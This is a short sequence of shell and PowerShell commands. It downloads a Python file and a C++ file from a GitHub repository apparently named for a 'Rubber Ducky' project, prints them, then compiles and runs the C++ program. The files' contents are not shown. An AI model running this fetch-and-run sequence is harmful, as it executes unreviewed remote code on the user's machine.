curl -o AI.py "https://raw.githubusercontent.com/RubberDucky67/ducky/main/AI.py"

cat AI.py

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RubberDucky67/ducky/refs/heads/main/main.cpp" -OutFile "main.cpp"

type main.cpp

g++ main.cpp -o main.exe

.\main.exe
